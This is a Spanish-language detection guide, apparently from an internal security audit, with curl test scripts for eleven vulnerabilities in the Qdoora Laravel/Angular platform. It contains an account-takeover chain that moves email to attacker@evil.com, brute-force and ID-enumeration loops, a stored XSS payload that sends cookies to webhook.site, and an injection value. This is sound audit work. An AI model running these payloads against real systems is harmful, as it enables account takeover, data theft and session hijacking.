# Vectores Qdoora — Guía de Detección Activa

> Fuente: Auditoría Inside Security — Agunsa Gemini (07/04/2026) + Perfiles (16/04/2026)
> Usa este archivo al iniciar CUALQUIER auditoría sobre el stack Qdoora.

---

## QD-01 — Client-Side Authorization Bypass
**Riesgo**: Angular Guards leen roles desde `localStorage` o del response de login. Un atacante
intercepta la respuesta con Burp Suite → Match & Replace → eleva sus privilegios sin que el
backend lo detecte. Reproduce el hallazgo C01 del informe Gemini.

**Test de confirmación:**
```bash
# 1. Login con usuario de bajo privilegio
TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"operador@qdoora.cl","password":"Pass1234!"}' | jq -r '.token')

# 2. Con Burp Suite Match & Replace:
#    Match:   "role":"operador"
#    Replace: "role":"admin"
# 3. Navegar a sección de Admin en Angular.
# Si Angular permite el acceso SIN que el backend bloquee → QD-01 CONFIRMADO
```

**Criterio de fallo**: El backend retorna 200 en endpoints de admin con el token del operador.

---

## QD-02 — Credentials en Endpoint de Parámetros
**Riesgo**: Endpoint de configuración del sistema (p.ej. `/api/global-variables` o
`/api/parameters`) devuelve secrets AWS IAM, SMTP, o llaves de API en texto claro.
Reproduce C02 del informe Gemini y C01 del informe Perfiles.

**Test de confirmación:**
```bash
# Con cualquier token autenticado, consultar endpoints de parámetros globales
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/global-variables | \
  jq 'to_entries[] | select(.value | type == "string" and (test("AKIA|smtp|password|secret|key"; "i")))'

# También verificar:
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/system/config
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/admin/settings
# Si alguno devuelve campos como aws_key, smtp_pass, app_key → QD-02 CONFIRMADO
```

---

## QD-03 — Account Takeover Chain (ATO)
**Riesgo**: Cadena de tres pasos que resulta en apropiación total de cualquier cuenta.
Reproduce C03 del informe Gemini y C02 del informe Perfiles.

**Paso 1 — Enumeración de usuarios:**
```bash
ADMIN_TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/login \
  -d '{"email":"admin@qdoora.cl","password":"Pass1234!"}' | jq -r '.token')

curl -H "Authorization: Bearer $ADMIN_TOKEN" https://api.qdoora.cl/api/users | \
  jq '[.data[] | {email, id, role}]'
# Si usuarios de bajo privilegio pueden llamar este endpoint → QD-03 paso 1 CONFIRMADO
```

**Paso 2 — Fuerza bruta con contraseña candidata:**
```bash
# Sin bloqueo de cuenta, iterar sobre la lista de emails
for EMAIL in $(cat users.txt); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://api.qdoora.cl/api/login \
    -d "{\"email\":\"$EMAIL\",\"password\":\"Qdoora2025!\"}")
  if [ "$STATUS" = "200" ]; then echo "HIT: $EMAIL"; fi
done
# Si alguno retorna 200 y nunca retornó 429 → QD-08 + QD-03 CONFIRMADOS
```

**Paso 3 — Email change sin current_password:**
```bash
curl -X PUT https://api.qdoora.cl/api/profile/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
# Si responde 200 sin pedir current_password → QD-03 paso 3 CONFIRMADO
# Luego: POST /api/password/forgot con el login de la víctima
# El código llega al email del atacante → ATO total
```

---

## QD-04 — BFLA (Broken Function Level Authorization)
**Riesgo**: Endpoints de funciones privilegiadas accesibles por roles inferiores porque solo
están ocultos en Angular pero no protegidos con `Gate::authorize()` en el controller Laravel.
Reproduce A01 del informe Gemini.

**Test de confirmación:**
```bash
OPERADOR_TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/login \
  -d '{"email":"operador@qdoora.cl","password":"Pass1234!"}' | jq -r '.token')

# Intentar acciones que en el menú solo aparecen para ADMIN
curl -X POST https://api.qdoora.cl/api/liquidaciones/123/aprobar \
  -H "Authorization: Bearer $OPERADOR_TOKEN"

curl -X DELETE https://api.qdoora.cl/api/companies/456 \
  -H "Authorization: Bearer $OPERADOR_TOKEN"

curl -X POST https://api.qdoora.cl/api/users \
  -H "Authorization: Bearer $OPERADOR_TOKEN" \
  -d '{"email":"new@test.cl","role":"admin"}'

# Si alguno retorna 200/201/204 → QD-04 CONFIRMADO para ese endpoint
```

---

## QD-05 — IDOR/BOLA en Documentos S3
**Riesgo**: Endpoint de descarga de documentos usa ID entero secuencial sin validar que el
`company_id` del documento coincide con el `company_id` del token JWT. Un atacante puede
exfiltrar todos los documentos de la plataforma iterando IDs. Reproduce A02 del informe Gemini.

**Test de confirmación:**
```bash
# Autenticado como empresa A, descubrir el propio ID y luego iterar
MY_IDS=$(curl -H "Authorization: Bearer $TOKEN_EMPRESA_A" \
  https://api.qdoora.cl/api/documents | jq -r '.data[].id')

# Iterar IDs cercanos
for id in $(seq 1 200); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_EMPRESA_A" \
    "https://api.qdoora.cl/api/documents/$id/download")
  [ "$STATUS" = "200" ] && echo "ACCESO NO AUTORIZADO: ID $id"
done

# También con UUIDs: si el endpoint acepta IDs numéricos además de UUIDs → QD-05
```

**Verificación adicional:** La presigned URL devuelta debería expirar en ≤ 10 minutos.
```bash
URL=$(curl -H "Authorization: Bearer $TOKEN" \
  "https://api.qdoora.cl/api/documents/1/download" | jq -r '.url')
# Esperar 15 minutos y reintentar la URL directa en S3
curl -I "$URL"
# Si retorna 200 después de 15 min → expiración insuficiente
```

---

## QD-06 — Cross-Portal Privilege Escalation
**Riesgo**: El Portal Admin/Soporte (Angular 21) y el Portal Cliente (Angular 18) consumen la
misma API. Si no hay separación de scopes o middleware por prefijo de ruta, un token de Portal
Cliente puede acceder a endpoints de gestión reservados para el Portal Admin.
Reproduce A03 del informe Gemini.

**Test de confirmación:**
```bash
CLIENTE_TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/login \
  -d '{"email":"cliente@empresa.cl","password":"Pass1234!"}' | jq -r '.token')

# Intentar rutas de administración con token de cliente
for ROUTE in \
  "/api/admin/users" \
  "/api/admin/companies" \
  "/api/admin/roles" \
  "/api/admin/audit-logs" \
  "/api/support/tickets/all"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $CLIENTE_TOKEN" \
    "https://api.qdoora.cl$ROUTE")
  echo "$ROUTE → $STATUS"
done
# Cualquier 200 → QD-06 CONFIRMADO
```

**Test de fuga SOPORTE → ADMIN (mismo portal Angular 21):**
```bash
SOPORTE_TOKEN=$(curl -s -X POST https://api.qdoora.cl/api/login \
  -d '{"email":"soporte@qdoora.cl","password":"Pass1234!"}' | jq -r '.token')

curl -X DELETE https://api.qdoora.cl/api/admin/users/999 \
  -H "Authorization: Bearer $SOPORTE_TOKEN"
# Si retorna 200/204 → escalamiento vertical SOPORTE→ADMIN CONFIRMADO
```

---

## QD-07 — Stored XSS via [innerHTML]
**Riesgo**: El backend almacena HTML sin sanitizar en campos de texto libre (nombres, descripciones,
comentarios). El frontend Angular renderiza con `[innerHTML]` ejecutando el script en el navegador
de cualquier usuario que visite la sección. Reproduce A01 del informe Perfiles.

**Test de confirmación:**
```bash
# Inyectar payload XSS en campo de texto libre
curl -X POST https://api.qdoora.cl/api/companies \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"<img src=x onerror=fetch(\"https://webhook.site/xxx?c=\"+document.cookie)>","rut":"12345678-9"}'

# Verificar que el payload se almacenó sin sanitizar
curl -H "Authorization: Bearer $TOKEN" https://api.qdoora.cl/api/companies | \
  grep -o '<img.*onerror'
# Si lo devuelve → backend vulnerable

# Verificar uso de [innerHTML] en Angular
grep -rn "innerHTML\|bypassSecurityTrustHtml" \
  /Users/francoalvaradotello/QdoorAChile/fuse-starter/src/ \
  --include="*.ts" --include="*.html"
# Cualquier match sin DomSanitizer justificado → QD-07 frontend vulnerable
```

---

## QD-08 — Rate Limiting Ausente
**Riesgo**: Sin throttle en endpoints de autenticación y operaciones costosas → fuerza bruta,
credential stuffing y DoS económico (generación masiva de PDFs, envío de emails al SII).
Reproduce A02 del informe Perfiles.

**Test endpoints de autenticación:**
```bash
for i in $(seq 1 15); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST https://api.qdoora.cl/api/login \
    -d '{"email":"test@qdoora.cl","password":"wrong'$i'"}')
  echo "Intento $i → HTTP $CODE"
done
# Si nunca aparece 429 → QD-08 CONFIRMADO en /login
```

**Test DoS económico en endpoints costosos:**
```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    "https://api.qdoora.cl/api/liquidaciones/123/pdf" \
    -H "Authorization: Bearer $TOKEN" &
done; wait
# Si todos retornan 200 → QD-08 en generación de PDF CONFIRMADO
```

---

## QD-09 — Login Response Expone Objeto de Permisos
**Riesgo**: La respuesta de `/api/login` devuelve el objeto completo de privilegios del usuario
(`permissions`, `is_admin`, `roles[]`). Un atacante intercepta y modifica estos campos client-side
para elevar sus privilegios sin invalidar el token. Reproduce C01 del informe Gemini.

**Test de confirmación:**
```bash
curl -s -X POST https://api.qdoora.cl/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"operador@qdoora.cl","password":"Pass1234!"}' | \
  jq '{permissions: .permissions, is_admin: .is_admin, privileges: .privileges, roles: .roles}'
# Si alguno de estos campos existe y contiene datos → QD-09 CONFIRMADO
```

---

## QD-10 — APP_DEBUG en Entornos No-Local
**Riesgo**: Stack traces de Laravel en entornos QA/Prod revelan rutas internas del servidor,
versión de Laravel, queries SQL fallidas y estructura de directorios.
Reproduce B01 de ambos informes.

**Test de confirmación:**
```bash
# Forzar error intencional
curl -s -X POST https://api.qdoora.cl/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":""},"password":null}' | jq .

curl -s https://api.qdoora.cl/api/ruta-que-no-existe-xyzabc123 | jq .

# Verificar variable de entorno en ECS
aws ecs describe-task-definition --task-definition qdoora-api | \
  jq '.taskDefinition.containerDefinitions[0].environment[] | select(.name=="APP_DEBUG")'
# Si value == "true" → QD-10 CONFIRMADO
```

---

## QD-11 — HTML Injection en PDFs
**Riesgo**: Datos de usuarios sin sanitizar se pasan a templates Blade de DomPDF/Snappy.
Un usuario puede inyectar HTML arbitrario en documentos oficiales (liquidaciones, DINs, facturas).
Reproduce M01 del informe Gemini.

**Test de confirmación:**
```bash
# Crear entidad con HTML en nombre
curl -X POST https://api.qdoora.cl/api/companies \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"<h1 style=\"color:red\">INYECTADO</h1>","rut":"12345678-9"}'

# Generar PDF que contenga ese nombre
curl -X POST https://api.qdoora.cl/api/liquidaciones/123/pdf \
  -H "Authorization: Bearer $TOKEN" -o test.pdf

# Abrir test.pdf y verificar si el H1 rojo aparece renderizado → QD-11 CONFIRMADO
```
